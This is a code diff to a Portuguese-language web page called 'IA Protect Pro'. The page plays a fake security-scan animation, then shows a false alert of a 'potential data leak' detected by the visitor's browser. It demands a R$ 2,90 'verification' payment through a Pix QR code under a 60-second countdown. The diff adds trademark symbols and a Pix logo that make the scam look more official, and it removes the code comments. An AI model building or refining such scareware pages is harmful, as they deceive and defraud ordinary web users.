@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>IA Protect Pro – Varredura de Segurança</title>
+  <title>IA Protect Pro® – Varredura de Segurança</title>
   <style>
     body {
       margin: 0;
@@ -68,17 +68,22 @@
       margin-top: 20px;
       font-weight: bold;
     }
+    .pix-logo {
+      height: 18px;
+      vertical-align: middle;
+      margin-left: 8px;
+    }
   </style>
 </head>
 <body>
 
-  <header>🔒 IA Protect Pro</header>
+  <header>🔒 IA Protect Pro®</header>
 
   <!-- TELA 1: ANIMAÇÃO DE VARREDURA -->
   <div id="scan" class="scan-section">
     <h2>Varredura de segurança em andamento...</h2>
     <div class="spinner"></div>
-    <p>Aguarde enquanto o IA Protect Pro analisa sua conexão.</p>
+    <p>Aguarde enquanto o IA Protect Pro® analisa sua conexão.</p>
   </div>
 
   <!-- TELA 2: ALERTA E PAGAMENTO -->
@@ -86,11 +91,15 @@
     <div class="shield">🛡️</div>
     <h2>Segurança de conexão ativada</h2>
     <p class="alert">🚨 Vazamento de dados em potencial detectado.</p>
-    <p>O navegador <strong><span id="browser-name"></span></strong> ativou automaticamente o protocolo <strong>IA Protect Pro</strong>, com tecnologia baseada em Inteligência Artificial.</p>
+    <p>O navegador <strong><span id="browser-name"></span></strong> ativou automaticamente o protocolo <strong>IA Protect Pro®</strong>, com tecnologia baseada em Inteligência Artificial.</p>
     <p>Para concluir a proteção em tempo real e garantir estabilidade durante sua navegação, realize a autenticação abaixo:</p>
 
-    <p style="margin-top: 20px;"><strong>🟡 Valor único de verificação: R$ 2,90</strong><br>
-    <small>(IA Protect opera por menos de $0.55 USD internacionalmente)</small></p>
+    <p style="margin-top: 20px;">
+      <strong>🟡 Valor único de verificação: R$ 2,90 
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Pix_Logo_2021.svg" class="pix-logo" alt="Pix Logo"/>
+      </strong><br>
+      <small>(IA Protect opera por menos de $0.55 USD internacionalmente)</small>
+    </p>
 
     <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=00020126360014BR.GOV.BCB.PIX0111qrfakepixkey" alt="QR Code Pix"/>
 
@@ -101,7 +110,6 @@
   </div>
 
   <script>
-    // Detectar navegador
     function getBrowser() {
       const ua = navigator.userAgent;
       if (ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR")) return "Google Chrome";
@@ -111,14 +119,12 @@
       return "Seu navegador";
     }
 
-    // Trocar tela após 5s
     setTimeout(() => {
       document.getElementById("scan").classList.add("hidden");
       document.getElementById("alerta").classList.remove("hidden");
       document.getElementById("browser-name").innerText = getBrowser();
     }, 5000);
 
-    // Copiar código Pix
     function copyPix() {
       const text = document.getElementById("pixCode").innerText;
       navigator.clipboard.writeText(text).then(() => {
@@ -126,7 +132,6 @@
       });
     }
 
-    // Contagem de 60s
     let seconds = 60;
     const countdownEl = document.getElementById("countdown");
     const interval = setInterval(() => {
@@ -141,3 +146,4 @@
 
 </body>
 </html>
+
